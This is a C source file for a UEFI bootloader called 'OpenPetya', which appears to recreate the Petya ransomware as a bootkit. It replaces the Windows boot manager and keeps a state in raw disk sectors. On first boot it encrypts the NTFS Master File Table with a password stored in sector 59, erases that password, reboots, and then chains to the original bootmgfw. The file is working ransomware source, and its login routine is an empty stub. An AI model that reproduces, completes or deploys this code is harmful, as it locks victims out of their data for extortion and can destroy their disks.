// bootloader.c

#include <efi.h>
#include <efilib.h>

#include "ntfs.h"
#include "ntfs_crypt.h"
#include "state.h"
#include "hidden_store.h"
#include "password_store.h"

#include "config.h"
#include "uefi_io.h"

void zero_buffer(char *buffer, int len)
{
    for (int i = 0; i < len; i++)
        buffer[i] = 0;
}

/// @brief Encrypt MFT
/// @param systab 
void do_encryption(void)
{
    UINT64 disk_size;
    UINT32 partition_lba;
    char password[65];

    uefi_clear();
    uefi_set_color(EFI_WHITE, EFI_BLUE);
    uefi_print("OpenPetya, 1st stage.\n\n");
    uefi_set_color(EFI_WHITE, EFI_BLACK);

    uefi_set_color(EFI_YELLOW, EFI_BLACK);
    uefi_print("First boot detected. Setting up encryption...\n");
    uefi_set_color(EFI_WHITE, EFI_BLACK);

    disk_size = state_read_disk_size();
    if (disk_size == 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: Disk size not set by installer.\n");

        uefi_halt();
    }

    uefi_print("Detecting NTFS partition...\n");
    partition_lba = ntfs_find_first_partitionLBA();
    if (partition_lba == 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: No NTFS partition found!\n");

        uefi_halt();
    }

    hidden_store_init(disk_size);

    uefi_print("[1/6] Backing up MFT...\n");
    if (hidden_backup_mft(partition_lba) != 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: MFT backup is failed.\n");

        uefi_halt();
    }

    uefi_print("[2/6] Generating salt...\n");
    if (ntfs_generate_salt() != 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: Salt generation failed!\n");

        uefi_halt();
    }

    uefi_print("[3/6] Reading password...\n");
    if (pwstore_read(password, sizeof(password)) != 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: No password in sector 59.\n");

        uefi_halt();
    }

    uefi_print("[4/6] Encrypting MFT...\n");
    if (ntfs_mft_encrypt(password, partition_lba) != 0)
    {
        zero_buffer(password, sizeof(password));
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: MFT encryption is failed.\n");

        uefi_halt();
    }

    zero_buffer(password, sizeof(password));

    uefi_print("[5/6] Erasing password from disk...\n");
    pwstore_erase();

    uefi_print("[6/6] Saving state...\n");
    if (state_write(STATE_ENCRYPTED) != 0)
    {
        uefi_set_color(EFI_RED, EFI_BLACK);
        uefi_print("ERROR: State save failed.\n");

        uefi_halt();
    }

    uefi_set_color(EFI_GREEN, EFI_BLACK);
    uefi_print("\nSetup is completed! Rebooting in 3 seconds...\n");
    
    uefi_sleep_ms(3000);
    uefi_reboot();
}

/// @brief Login panel
/// @param systab 
void do_login(void)
{
    UINT32 partition_lba = 0;
    UINT64 disk_size = 0;
    char input[65] = { 0 };
    int attempts = 0;

    uefi_clear();
}

/// @brief main function
/// @param image 
/// @param systab 
/// @return 
EFI_STATUS efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    EFI_STATUS status;

    EFI_SYSTEM_TABLE *st = systab;
    EFI_BOOT_SERVICES *bs = systab->BootServices;
    EFI_RUNTIME_SERVICES *rs = systab->RuntimeServices;
    EFI_BLOCK_IO *bi = NULL;
    UINT32 media_id = 0;

    InitializeLib(image, systab);

    UINTN handle_count = 0;
    EFI_HANDLE *handles = NULL;
    EFI_GUID bio_guid = EFI_BLOCK_IO_PROTOCOL_GUID;

    status = bs->LocateHandleBuffer(ByProtocol, &bio_guid, NULL, &handle_count, &handles);

    if (EFI_ERROR(status))
    {
        uefi_print("Cannot locate block devices!\n");
        return status;
    }

    for (UINTN i = 0; i < handle_count; i++)
    {
        EFI_BLOCK_IO *bio = NULL;
        status = bs->HandleProtocol(handles[i], &bio_guid, (void **)&bio);
        if (EFI_ERROR(status))
            continue;
        if (!bio->Media->MediaPresent)
            continue;
        if (bio->Media->LogicalPartition)
            continue;

        // try to read sector 60 to find the magic value.
        UINT8 sector[512] = { 0 };
        bio->ReadBlocks(bio, bio->Media->MediaId, STATE_SECTOR, 512, sector);
        UINT32 magic = *(UINT32 *)sector;
        if (magic == STATE_MAGIC)
        {
            // found the disk
            bi = bio;
            media_id = bio->Media->MediaId;
            break;
        }
    }

    bs->FreePool(handles);
    if (!bi)
    {
        uefi_print("Cannot find the disk! (no state sector magic)\n");
        bs->Stall(5000000);
        return EFI_NOT_FOUND;
    }

    uefi_io_init(bi, rs, bs, media_id, systab);

    // read disk and branch
    UINT8 state_raw[512];
    uefi_read_sector(STATE_SECTOR, state_raw);
    UINT8 state = state_raw[4];

    if (state == 0x00)
        do_encryption();
    else
        do_login();

    // After login() returns successfully, launch original bootmgfw.efi
    // Load bootmgfw_original.efi from ESP
    EFI_GUID lip_guid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
    EFI_GUID sfsp_guid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;

    CHAR16 *original_path = L"\\EFI\\Microsoft\\Boot\\bootmgfw.original.efi";

    EFI_DEVICE_PATH *dp = FileDevicePath(NULL, original_path);
    EFI_HANDLE new_image = NULL;

    status = bs->LoadImage(FALSE, image, dp, NULL, 0, &new_image);
    if (EFI_ERROR(status))
    {
        uefi_print("Cannot load bootmgfw_original.efi!\n");
        bs->Stall(5000000);

        return status;
    }

    status = bs->StartImage(new_image, NULL, NULL);

    return status;

    // EFI_INPUT_KEY key;
    // Print(L"Press any key to continue...\n");
    // WaitForSingleEvent(systab->ConIn->WaitForKey, 0);
    // systab->ConIn->ReadKeyStroke(systab->ConIn, &key);

    // return EFI_SUCCESS;
}